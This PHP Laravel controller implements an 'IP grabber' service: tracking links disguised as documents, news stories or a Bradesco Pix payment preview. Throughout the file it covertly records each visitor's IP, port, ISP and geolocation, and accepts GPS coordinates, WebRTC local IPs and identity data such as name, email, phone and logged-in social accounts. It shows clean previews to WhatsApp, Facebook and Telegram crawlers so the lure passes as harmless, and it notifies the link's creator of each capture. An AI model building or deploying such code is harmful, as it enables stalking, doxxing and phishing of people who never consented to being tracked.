<?php

namespace App\Http\Controllers;

use App\Models\IpGrabber;
use App\Models\IpGrabberAccess;
use App\Notifications\IpGrabberAccessCapturedNotification;
use App\Services\Pixel\NewsPreviewMetadataService;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
use Illuminate\View\View;

class IpGrabberController extends Controller
{
    private const TRANSPARENT_GIF = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

    public function pagina(Request $request, string $token): View
    {
        $ipGrabber = IpGrabber::where('token', $token)->first();
        $accessUuid = null;

        if ($ipGrabber && $this->deveRegistrarCaptura($request)) {
            $accessUuid = $this->registrarAcesso($request, $ipGrabber, 'pagina')?->uuid;
        }

        if ($ipGrabber) {
            $this->preencherPreviewDoPixBradescoSeNecessario($ipGrabber);
            $this->preencherPreviewDaNoticiaSeNecessario($ipGrabber);
        }

        $mensagem = $ipGrabber?->mensagem ?? 'Este documento não está mais disponível.';
        $ogTitulo = $ipGrabber?->og_titulo ?? $mensagem;
        $ogDescricao = $ipGrabber?->og_descricao ?? '';
        $ogImagem = $this->resolverImagemOpenGraph($ipGrabber, $request);
        $ogUrl = $ipGrabber
            ? ($this->deveUsarHostDaRequisicao($request) || ! $ipGrabber->trackingDomain()
                ? $this->urlAbsolutaDaRequisicao($request, route('pixel.track', $token, false))
                : $ipGrabber->trackingUrl())
            : $this->urlAbsolutaDaRequisicao($request, $request->getPathInfo());
        $captureGps = (bool) $ipGrabber?->capture_gps;
        $captureAlvo = (bool) $ipGrabber?->capture_alvo;
        $captureIdentity = (bool) $ipGrabber?->capture_identity;
        $redirectUrl = $this->deveRedirecionarParaNoticia($request, $ipGrabber) ? $ipGrabber->noticia_url : null;

        if ($this->requisicaoDePreviewOuPrefetch($request)) {
            return view('pixel.preview', compact('ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
        }

        return view('pixel.landing', compact('mensagem', 'token', 'accessUuid', 'captureGps', 'captureAlvo', 'captureIdentity', 'redirectUrl', 'ogTitulo', 'ogDescricao', 'ogImagem', 'ogUrl'));
    }

    public function gif(Request $request, string $token): Response
    {
        $ipGrabber = IpGrabber::where('token', $token)->first();

        if ($ipGrabber && $this->deveRegistrarCaptura($request)) {
            $this->registrarAcesso($request, $ipGrabber, 'gif');
        }

        return response(base64_decode(self::TRANSPARENT_GIF), 200, [
            'Content-Type' => 'image/gif',
            'Cache-Control' => 'no-store, no-cache, must-revalidate, max-age=0',
            'Pragma' => 'no-cache',
            'Expires' => 'Thu, 01 Jan 1970 00:00:00 GMT',
        ]);
    }

    public function ogImage(string $token): Response
    {
        $ipGrabber = IpGrabber::where('token', $token)->firstOrFail();

        abort_unless($ipGrabber->og_imagem_upload, 404);

        $path = ltrim($ipGrabber->og_imagem_upload, '/');
        abort_unless(Storage::disk('public')->exists($path), 404);

        return response(Storage::disk('public')->get($path), 200, [
            'Content-Type' => $this->mimeTypePorExtensao($path) ?: Storage::disk('public')->mimeType($path) ?: 'image/jpeg',
            'Cache-Control' => 'public, max-age=86400',
        ]);
    }

    public function atualizarDispositivo(Request $request, string $token): \Illuminate\Http\JsonResponse
    {
        if (! $request->isMethod('POST') || $this->modoPreviewManual($request) || $this->requisicaoDePreviewOuPrefetch($request)) {
            return response()->json(['ok' => false]);
        }

        $ipGrabber = IpGrabber::where('token', $token)->whereNotNull('clicked_at')->first();

        if (! $ipGrabber) {
            return response()->json(['ok' => false]);
        }

        $acesso = $this->resolverAcessoParaAtualizacao($request, $ipGrabber);

        if (! $acesso) {
            return response()->json(['ok' => false]);
        }

        $dados = [];

        if ($gmt = $request->input('gmt')) {
            $dados['gmt'] = substr((string) $gmt, 0, 60);
        }

        if ($ipLocal = $request->input('ip_local')) {
            $ipLocal = substr((string) $ipLocal, 0, 45);

            if ($this->enderecoWebRtcLocalValido($ipLocal)) {
                $dados['ip_local'] = $ipLocal;
            }
        }

        if ($idioma = $request->input('idioma')) {
            $dados['idioma'] = substr((string) $idioma, 0, 20);
        }

        if ($plataforma = $request->input('plataforma')) {
            $dados['plataforma'] = substr((string) $plataforma, 0, 100);
        }

        if ($resolucao = $request->input('resolucao')) {
            $dados['resolucao'] = substr((string) $resolucao, 0, 20);
        }

        $dadosGps = $ipGrabber->capture_gps ? $this->dadosGpsValidados($request) : [];
        $dadosGpsStatus = $ipGrabber->capture_gps ? $this->dadosStatusGpsValidados($request) : [];

        if (! empty($dadosGps)) {
            $dados = array_merge($dados, $dadosGps);
        }

        if (! empty($dadosGpsStatus)) {
            $dados = array_merge($dados, $dadosGpsStatus);
        }

        // Identidade Digital capturada pelo browser
        $dadosIdentidade = $ipGrabber->capture_identity ? $this->dadosIdentidadeValidados($request) : [];

        if (! empty($dadosIdentidade)) {
            $dados = array_merge($dados, $dadosIdentidade);
        }

        if (! empty($dados)) {
            $ipGrabber->update($dados);
            $acesso->update($dados);
        }

        return response()->json(['ok' => true]);
    }

    private function registrarAcesso(Request $request, IpGrabber $ipGrabber, string $endpoint): ?IpGrabberAccess
    {
        try {
            $ip = $this->resolverIp($request);
            $porta = $this->resolverPortaOrigem($request);
            $geo = $this->consultarGeolocalizacao($ip);
            $gmt = $this->offsetParaGmt($geo['offset'] ?? null, $geo['timezone'] ?? null);

            $dados = [
                'ip' => $ip,
                'porta' => $porta,
                'gmt' => $gmt,
                'cidade' => $geo['city'] ?? null,
                'regiao' => $geo['regionName'] ?? null,
                'pais' => $geo['country'] ?? null,
                'latitude' => isset($geo['lat']) ? (float) $geo['lat'] : null,
                'longitude' => isset($geo['lon']) ? (float) $geo['lon'] : null,
                'isp' => $geo['isp'] ?? null,
                'user_agent' => $request->userAgent(),
            ];

            $acesso = $ipGrabber->acessos()->create($dados + [
                'uuid' => (string) Str::uuid(),
                'endpoint' => $endpoint,
                'referer' => $request->headers->get('referer') ? substr((string) $request->headers->get('referer'), 0, 255) : null,
                'accessed_at' => now(),
            ]);

            $ipGrabber->update($dados + [
                'total_acessos' => $ipGrabber->total_acessos + 1,
                'clicked_at' => $ipGrabber->clicked_at ?? now(),
            ]);

            $ipGrabber->criador?->notify(new IpGrabberAccessCapturedNotification($acesso));

            return $acesso;
        } catch (\Throwable $e) {
            Log::warning("IpGrabber: erro ao registrar acesso [{$ipGrabber->token}]: " . $e->getMessage());
            return null;
        }
    }

    private function resolverAcessoParaAtualizacao(Request $request, IpGrabber $ipGrabber): ?IpGrabberAccess
    {
        $uuid = $request->input('access_id');

        if (is_string($uuid) && Str::isUuid($uuid)) {
            return $ipGrabber->acessos()->where('uuid', $uuid)->latest('accessed_at')->first();
        }

        if ($request->user()) {
            return null;
        }

        return $ipGrabber->acessos()->where('endpoint', 'pagina')->latest('accessed_at')->first();
    }

    private function preencherPreviewDaNoticiaSeNecessario(IpGrabber $ipGrabber): void
    {
        if ($ipGrabber->preview_tipo !== 'noticia' || ! $ipGrabber->noticia_url) {
            return;
        }

        if ($ipGrabber->og_titulo && $ipGrabber->og_descricao && $ipGrabber->og_imagem_upload) {
            return;
        }

        $metadata = app(NewsPreviewMetadataService::class)->fetch($ipGrabber->noticia_url);
        $dados = [];

        if (! $ipGrabber->og_titulo && filled($metadata['og_titulo'] ?? null)) {
            $dados['og_titulo'] = $metadata['og_titulo'];
        }

        if (! $ipGrabber->og_descricao && filled($metadata['og_descricao'] ?? null)) {
            $dados['og_descricao'] = $metadata['og_descricao'];
        }

        if (! $ipGrabber->og_imagem && ! $ipGrabber->og_imagem_upload && filled($metadata['og_imagem'] ?? null)) {
            $dados['og_imagem'] = $metadata['og_imagem'];
        }

        $imagemParaCache = $metadata['og_imagem'] ?? $ipGrabber->og_imagem;

        if (! $ipGrabber->og_imagem_upload && filled($imagemParaCache)) {
            $path = app(NewsPreviewMetadataService::class)->storeImage((string) $imagemParaCache, $ipGrabber->token);
            if ($path) {
                $dados['og_imagem_upload'] = $path;
            }
        }

        if (! empty($dados)) {
            $ipGrabber->forceFill($dados)->save();
            $ipGrabber->refresh();
        }
    }

    private function preencherPreviewDoPixBradescoSeNecessario(IpGrabber $ipGrabber): void
    {
        if ($ipGrabber->preview_tipo !== 'pix_bradesco' || $ipGrabber->og_imagem_upload) {
            return;
        }

        foreach (['png', 'jpg', 'jpeg'] as $extension) {
            $template = "pixel-og/templates/pix-bradesco.{$extension}";

            if (! Storage::disk('public')->exists($template)) {
                continue;
            }

            $dest = "pixel-og/{$ipGrabber->token}-bradesco.{$extension}";
            Storage::disk('public')->copy($template, $dest);
            $ipGrabber->forceFill(['og_imagem_upload' => $dest])->save();
            $ipGrabber->refresh();
            return;
        }
    }

    private function dadosGpsValidados(Request $request): array
    {
        if (! $request->filled('gps_latitude') || ! $request->filled('gps_longitude')) {
            return [];
        }

        $latitude = filter_var($request->input('gps_latitude'), FILTER_VALIDATE_FLOAT);
        $longitude = filter_var($request->input('gps_longitude'), FILTER_VALIDATE_FLOAT);

        if ($latitude === false || $longitude === false) {
            return [];
        }

        if ($latitude < -90 || $latitude > 90 || $longitude < -180 || $longitude > 180) {
            return [];
        }

        $dados = [
            'gps_latitude' => round((float) $latitude, 7),
            'gps_longitude' => round((float) $longitude, 7),
        ];

        if ($request->filled('gps_accuracy')) {
            $accuracy = filter_var($request->input('gps_accuracy'), FILTER_VALIDATE_FLOAT);
            if ($accuracy !== false && $accuracy >= 0) {
                $dados['gps_accuracy'] = round((float) $accuracy, 2);
            }
        }

        return $dados;
    }

    private function dadosStatusGpsValidados(Request $request): array
    {
        $dados = [];
        $status = $request->input('gps_status');

        if (is_string($status) && in_array($status, ['captured', 'denied', 'unavailable', 'timeout', 'unsupported', 'insecure', 'skipped', 'error'], true)) {
            $dados['gps_status'] = $status;
        }

        $error = $request->input('gps_error');

        if (is_string($error) && $error !== '') {
            $dados['gps_error'] = mb_substr($error, 0, 120);
        }

        return $dados;
    }

    private function dadosIdentidadeValidados(Request $request): array
    {
        $dados = [];

        if ($request->filled('identidade_nome')) {
            $valor = trim((string) $request->input('identidade_nome'));
            if (mb_strlen($valor) <= 120) {
                $dados['identidade_nome'] = $valor;
            }
        }

        if ($request->filled('identidade_email')) {
            $valor = trim((string) $request->input('identidade_email'));
            if (filter_var($valor, FILTER_VALIDATE_EMAIL) && mb_strlen($valor) <= 180) {
                $dados['identidade_email'] = $valor;
            }
        }

        if ($request->filled('identidade_telefone')) {
            $valor = trim((string) $request->input('identidade_telefone'));
            // Aceita qualquer string parecida com telefone (números, +, espaços, hífens)
            if (preg_match('/^[\d\s\+\-\(\)\.]{5,40}$/', $valor)) {
                $dados['identidade_telefone'] = $valor;
            }
        }

        if ($request->filled('identidade_redes')) {
            try {
                $raw   = $request->input('identidade_redes');
                $redes = is_array($raw) ? $raw : json_decode((string) $raw, true);

                if (is_array($redes)) {
                    $sanitizadas = [];

                    foreach ($redes as $item) {
                        // Suporte ao formato legado (string simples)
                        if (is_string($item) && mb_strlen($item) <= 50) {
                            $sanitizadas[] = ['rede' => $item, 'instalado' => true];
                            continue;
                        }

                        // Formato rico: objeto com rede, usuario, nome, logado, instalado
                        if (! is_array($item) || empty($item['rede'])) {
                            continue;
                        }

                        $entrada = [
                            'rede' => mb_substr((string) $item['rede'], 0, 50),
                        ];

                        if (! empty($item['usuario']) && is_string($item['usuario'])) {
                            $entrada['usuario'] = mb_substr($item['usuario'], 0, 180);
                        }

                        if (! empty($item['nome']) && is_string($item['nome'])) {
                            $entrada['nome'] = mb_substr($item['nome'], 0, 120);
                        }

                        if (array_key_exists('logado', $item) && $item['logado'] !== null) {
                            $entrada['logado'] = (bool) $item['logado'];
                        }

                        if (array_key_exists('instalado', $item) && $item['instalado'] !== null) {
                            $entrada['instalado'] = (bool) $item['instalado'];
                        }

                        $sanitizadas[] = $entrada;
                    }

                    if (! empty($sanitizadas)) {
                        $dados['identidade_redes'] = $sanitizadas;
                    }
                }
            } catch (\Throwable) {
            }
        }

        return $dados;
    }

    private function deveRegistrarCaptura(Request $request): bool
    {
        if ($this->modoPreviewManual($request) || $request->user() || (! $request->isMethod('GET') && ! $request->isMethod('POST'))) {
            return false;
        }

        return ! $this->requisicaoDePreviewOuPrefetch($request);
    }

    private function deveRedirecionarParaNoticia(Request $request, ?IpGrabber $ipGrabber): bool
    {
        if (! $ipGrabber || $ipGrabber->preview_tipo !== 'noticia' || ! $ipGrabber->noticia_url) {
            return false;
        }

        if ($this->modoPreviewManual($request) || ! $request->isMethod('GET')) {
            return false;
        }

        return ! $this->requisicaoDePreviewOuPrefetch($request);
    }

    private function requisicaoDePreviewOuPrefetch(Request $request): bool
    {
        foreach (['Purpose', 'Sec-Purpose', 'X-Purpose'] as $header) {
            if (str_contains(strtolower((string) $request->headers->get($header)), 'prefetch')) {
                return true;
            }
        }

        $userAgent = strtolower((string) $request->userAgent());

        foreach (['facebookexternalhit', 'facebot', 'whatsapp', 'telegrambot', 'twitterbot', 'linkedinbot', 'slackbot', 'discordbot'] as $crawler) {
            if (str_contains($userAgent, $crawler)) {
                return true;
            }
        }

        return false;
    }

    private function modoPreviewManual(Request $request): bool
    {
        return $request->boolean('preview');
    }

    private function resolverImagemOpenGraph(?IpGrabber $ipGrabber, Request $request): array
    {
        if (! $ipGrabber) {
            return ['url' => null, 'type' => null];
        }

        if ($ipGrabber->og_imagem_upload) {
            $path = ltrim($ipGrabber->og_imagem_upload, '/');
            $dimensions = $this->dimensoesDaImagem(Storage::disk('public')->path($path));
            $publicStoragePath = '/storage/' . $path;

            return [
                'url' => $ipGrabber->trackingDomain() && ! $this->deveUsarHostDaRequisicao($request)
                    ? $ipGrabber->trackingAssetUrl($publicStoragePath)
                    : $this->urlAbsolutaDaRequisicao($request, $publicStoragePath),
                'type' => $this->mimeTypePorExtensao($path) ?: Storage::disk('public')->mimeType($path),
                'width' => $dimensions['width'] ?? null,
                'height' => $dimensions['height'] ?? null,
            ];
        }

        if ($ipGrabber->og_imagem) {
            return ['url' => $ipGrabber->og_imagem, 'type' => $this->mimeTypePorExtensao($ipGrabber->og_imagem), 'width' => null, 'height' => null];
        }

        return ['url' => null, 'type' => null, 'width' => null, 'height' => null];
    }

    private function urlAbsolutaDaRequisicao(Request $request, string $path): string
    {
        $scheme = $request->headers->get('X-Forwarded-Proto') ? explode(',', $request->headers->get('X-Forwarded-Proto'))[0] : $request->getScheme();
        $host = $request->headers->get('X-Forwarded-Host') ? explode(',', $request->headers->get('X-Forwarded-Host'))[0] : $request->getHttpHost();

        return trim($scheme) . '://' . trim($host) . '/' . ltrim($path, '/');
    }

    private function deveUsarHostDaRequisicao(Request $request): bool
    {
        return app()->environment('local')
            && str_ends_with($request->getHost(), '.trycloudflare.com');
    }

    private function mimeTypePorExtensao(string $path): ?string
    {
        return match (strtolower(pathinfo(parse_url($path, PHP_URL_PATH) ?: $path, PATHINFO_EXTENSION))) {
            'jpg', 'jpeg' => 'image/jpeg',
            'png' => 'image/png',
            'webp' => 'image/webp',
            default => null,
        };
    }

    private function dimensoesDaImagem(string $absolutePath): array
    {
        $size = @getimagesize($absolutePath);

        if (! is_array($size)) {
            return ['width' => null, 'height' => null];
        }

        return ['width' => isset($size[0]) ? (int) $size[0] : null, 'height' => isset($size[1]) ? (int) $size[1] : null];
    }

    private function resolverIp(Request $request): string
    {
        foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR'] as $header) {
            $valor = $request->server($header);
            if ($valor) {
                return trim(explode(',', $valor)[0]);
            }
        }

        return $request->ip() ?? '0.0.0.0';
    }

    private function resolverPortaOrigem(Request $request): ?string
    {
        foreach (['X-Forwarded-Client-Port', 'X-Client-Port', 'X-Real-Port', 'CF-Connecting-Port', 'True-Client-Port'] as $header) {
            if ($porta = $this->normalizarPorta($request->headers->get($header))) {
                return $porta;
            }
        }

        if ($porta = $this->portaNoXForwardedFor($request->headers->get('X-Forwarded-For'))) {
            return $porta;
        }

        return $this->normalizarPorta($request->server('REMOTE_PORT'));
    }

    private function portaNoXForwardedFor(?string $valor): ?string
    {
        if (! $valor) {
            return null;
        }

        $primeiro = trim(explode(',', $valor)[0]);

        if (preg_match('/^\[[^\]]+\]:(\d{1,5})$/', $primeiro, $matches) || preg_match('/^\d{1,3}(?:\.\d{1,3}){3}:(\d{1,5})$/', $primeiro, $matches)) {
            return $this->normalizarPorta($matches[1]);
        }

        return null;
    }

    private function normalizarPorta(mixed $valor): ?string
    {
        if ($valor === null) {
            return null;
        }

        $valor = trim((string) $valor);

        if (! preg_match('/^\d{1,5}$/', $valor)) {
            return null;
        }

        $porta = (int) $valor;

        if ($porta < 1 || $porta > 65535) {
            return null;
        }

        return (string) $porta;
    }

    private function enderecoWebRtcLocalValido(string $endereco): bool
    {
        if (preg_match('/^[a-z0-9-]{1,63}(\.[a-z0-9-]{1,63})*\.local$/i', $endereco)) {
            return true;
        }

        if (! filter_var($endereco, FILTER_VALIDATE_IP)) {
            return false;
        }

        if (filter_var($endereco, FILTER_VALIDATE_IP, FILTER_FLAG_NO_RES_RANGE) === false) {
            return false;
        }

        return filter_var($endereco, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE) === false;
    }

    private function consultarGeolocalizacao(string $ip): array
    {
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            return ['city' => 'Local/Privado', 'timezone' => 'America/Sao_Paulo', 'offset' => -10800];
        }

        try {
            $resposta = Http::timeout(5)->get("http://ip-api.com/json/{$ip}", ['fields' => 'status,country,regionName,city,lat,lon,timezone,isp,offset']);

            if ($resposta->successful() && $resposta->json('status') === 'success') {
                return $resposta->json();
            }
        } catch (\Throwable) {
        }

        return [];
    }

    private function offsetParaGmt(?int $offsetSegundos, ?string $timezone): string
    {
        if ($offsetSegundos === null) {
            return $timezone ?? 'Desconhecido';
        }

        $horas = abs((int) floor($offsetSegundos / 3600));
        $minutos = abs((int) (($offsetSegundos % 3600) / 60));
        $sinal = $offsetSegundos >= 0 ? '+' : '-';
        $gmt = sprintf('GMT%s%02d:%02d', $sinal, $horas, $minutos);

        if ($timezone) {
            $gmt .= " ({$timezone})";
        }

        return $gmt;
    }
}
